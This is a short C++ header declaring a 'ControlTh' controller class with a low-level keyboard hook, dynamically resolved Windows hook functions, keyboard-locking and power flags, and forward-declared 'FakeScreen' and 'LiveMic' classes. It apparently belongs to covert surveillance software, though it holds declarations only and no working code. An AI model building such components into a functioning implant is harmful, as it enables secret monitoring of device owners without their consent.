#pragma once

#define TIMER_BOOST_FREQ	100
#define TIMER_START_FREQ	300

#define WH_KEYBOARD_LL 0x14

LRESULT WndKeyProc(INT code, WPARAM wParam, LPARAM lParam);
VOID	pfnFuncProc();

typedef struct {
	DWORD vkCode;
	DWORD scanCode;
	DWORD flags;
	DWORD time;
	ULONG_PTR dwExtraInfo;
} KBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;

typedef HHOOK (*t_SetWindowsHookEx)(int, LPVOID, HINSTANCE, DWORD);
typedef BOOL (*t_UnhookWindowsHookEx)(HHOOK);
typedef LRESULT (*t_CallNextHookEx)(HHOOK, int, WPARAM, LPARAM);

class FakeScreen;
class LiveMic;

class ControlTh
{
private:
	static ControlTh*		m_pInstance;
	static volatile LONG	m_lLock;
	
	HINSTANCE m_hDll;
	HANDLE m_hKeyThread, m_hSignal;

	FakeScreen* pScreen;
	LiveMic* pLiveMic;
	
protected:
	ControlTh(void);

public:
	BOOL bKeyboardLocked, bHooked, bStopThread, m_bPowerStatusOn;
	UINT uStartTimer, uBackligthONTimes;
	WCHAR* wcsState;
	HHOOK hHook;
	DWORD dwStatus;
	MSG ControlThMsg;

	static ControlTh* self();
	~ControlTh(void);

	t_SetWindowsHookEx SetWindowsHookEx;
	t_UnhookWindowsHookEx UnhookWindowsHookEx;
	t_CallNextHookEx CallNextHookEx;

	BOOL Start();
	BOOL Init();
	HANDLE GetStopThEventHandle() { return m_hSignal; }
	DWORD Stop();
	VOID Uninit();
};